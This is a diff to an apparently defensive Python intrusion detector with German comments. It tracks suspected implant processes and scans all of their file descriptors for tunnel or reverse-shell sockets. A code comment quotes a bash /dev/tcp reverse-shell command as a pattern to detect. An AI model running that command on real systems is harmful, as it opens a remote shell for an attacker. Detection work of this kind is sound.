@@ -1233,6 +1233,7 @@ _output_compiled = [(re.compile(p, re.IGNORECASE), lbl, sev) for p, lbl, sev in 
 
 _alerted_rootkit:   dict = {}  # key -> last-alert monotonic time
 _alerted_implants:  dict = {}  # key -> last-alert monotonic time
+_known_implant_pids: set = set()  # PIDs die als Implant erkannt wurden (für find_tunnel_shells)
 
 # Namen echter Kernel-kworker-Threads (haben keine exe und keine Sockets)
 _KWORKER_RE   = re.compile(r'^kworker/')
@@ -1285,6 +1286,7 @@ def _check_process_implants():
     # ── 1 + 2: Fake kworker + Watchdog-Paar ─────────────────────────
     fake_pids = {pid for pid, info in all_procs.items()
                  if _KWORKER_RE.match(info['name']) and info['exe']}
+    _known_implant_pids.update(fake_pids)
     for pid in fake_pids:
         info  = all_procs[pid]
         ppid  = info['ppid']
@@ -1320,6 +1322,7 @@ def _check_process_implants():
         if pid in fake_pids:
             continue
         if info['exe'].endswith(' (deleted)') and info['name'] not in _SAFE_DELETED:
+            _known_implant_pids.add(pid)
             key = f'deleted:{pid}'
             if now - _alerted_implants.get(key, -999) > 60:
                 _alerted_implants[key] = now
@@ -1378,6 +1381,8 @@ def _check_process_implants():
         pid_str = stale.split(':')[-1]
         if pid_str.isdigit() and int(pid_str) not in all_procs:
             del _alerted_implants[stale]
+    # PIDs die nicht mehr existieren aus dem Implant-Set entfernen (PID-Reuse-Schutz)
+    _known_implant_pids.intersection_update(all_procs.keys())
 
     return hits
 
@@ -1944,8 +1949,11 @@ def find_tunnel_shells():
                 # FD 0,1,2 immer prüfen (stdin+stdout+stderr), bei shellish alle FDs.
                 # So werden auch 'bash -i >& /dev/tcp/IP/PORT 0>&1' Muster erkannt
                 # wo der Socket auf FD 1/2 liegt, bevor die 0>&1 Umleitung greift.
+                # Bereits als Implant erkannte PIDs (getarnter Prozessname, z.B.
+                # sd-pam mit gelöschtem Binary) ebenfalls auf allen FDs prüfen –
+                # ihr Socket liegt oft nicht auf stdin/stdout/stderr.
                 fd_names = ['0', '1', '2']
-                if shellish:
+                if shellish or (pid.isdigit() and int(pid) in _known_implant_pids):
                     fd_names = os.listdir(f'/proc/{pid}/fd')
                 for fd_name in fd_names:
                     link = os.readlink(f'/proc/{pid}/fd/{fd_name}')
